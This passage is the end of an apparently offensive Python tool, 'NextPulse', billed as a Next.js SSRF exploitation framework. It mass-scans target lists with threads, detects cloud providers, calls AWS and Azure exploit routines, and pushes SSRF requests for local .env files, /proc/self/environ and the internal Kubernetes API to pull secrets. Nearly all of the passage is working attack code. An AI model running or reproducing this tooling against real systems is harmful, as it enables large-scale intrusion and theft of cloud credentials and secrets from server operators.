    print(f"   Targets scanned : {len(results)}")
    print(f"   Vulnerable      : {C_RED}{C_BLD}{len(vuln)}{C_RST}")
    print(f"   SSRF Confirmed  : {C_RED}{C_BLD}{len(hits)}{C_RST}")
    if hits:
        print(f"\n{C_PINK}{C_BLD} Confirmed Vulnerable Target Vector Summary: {C_RST}")
        for r in hits[:5]: print(f"   • {C_WHITE}{C_BLD}{r['target']}{C_RST}")
    print(f"{C_PANEL}═════════════════════════════════════════════════════════════════════════════════════════════{C_RST}")

def main():
    global _exit
    p = argparse.ArgumentParser(prog="nextpulse", description="NextPulse — CVE-2026-44578 Next.js SSRF Framework")
    p.add_argument("-t", "--target")
    p.add_argument("--pipe", action="store_true")
    p.add_argument("-f", "--file")
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--cloud", choices=["aws", "azure", "gcp", "do", "oracle", "alibaba", "kubernetes", "leex", "all"], default="aws")
    p.add_argument("--ssrf", help="Custom SSRF target")
    p.add_argument("--force", action="store_true")
    p.add_argument("--interactive", "-i", action="store_true")
    p.add_argument("--auto", action="store_true")
    p.add_argument("-o", "--output")
    p.add_argument("--no-banner", action="store_true")
    args = p.parse_args()

    if not args.no_banner: banner()

    def _sig(s, f):
        warn("Scan interrupted by user")
        summary(_results)
        if args.output: _save(args.output)
        sys.exit(_exit)
    signal.signal(signal.SIGINT, _sig)

    targets = []
    if args.target: targets.append(args.target)
    if args.pipe:
        for line in sys.stdin:
            t_str = line.strip()
            if t_str: targets.append(t_str)
    if args.file:
        with open(args.file) as f:
            targets.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])

    if not targets:
        err("No targets provided")
        sys.exit(1)

    targets = [t if t.startswith("http") else "https://" + t for t in targets]

    if args.interactive or args.auto:
        if len(targets) != 1:
            err("Interactive/auto requires single target")
            sys.exit(1)
        host, port, use_ssl = parse_target(targets[0])
        if args.auto:
            clouds = detect_cloud(host, port, use_ssl, args.timeout)
            if "aws" in clouds: exploit_aws(host, port, use_ssl, args.timeout)
            elif "azure" in clouds: exploit_azure(host, port, use_ssl, args.timeout)
            else:
                for u in ["http://127.0.0.1/.env", "http://127.0.0.1/proc/self/environ", "http://kubernetes.default.svc/api/v1/"]: ssrf(host, port, use_ssl, u, args.timeout)
        else: interactive(targets[0], args.timeout)
        return

    if len(targets) == 1:
        r = scan(targets[0], args)
        if r: _results.append(r)
    else:
        step(f"Mass scan started — {len(targets)} targets | {args.threads} threads")
        q = Queue()
        for t in targets: q.put(t)
        ts = [threading.Thread(target=worker, args=(q, args), daemon=True) for _ in range(min(args.threads, len(targets)))]
        for t in ts: t.start()
        try: q.join()
        except KeyboardInterrupt: _sig(None, None)

    summary(_results)
    if args.output: _save(args.output)
    sys.exit(_exit)

def _save(path):
    fmt = "json" if path.endswith(".json") else "jsonl"
    with open(path, "w") as f:
        if fmt == "json": json.dump(_results, f, indent=2, default=str)
        else:
            for r in _results: f.write(json.dumps(r, default=str) + "\n")
    info(f"Results saved: {path}")

if __name__ == "__main__":
    main()
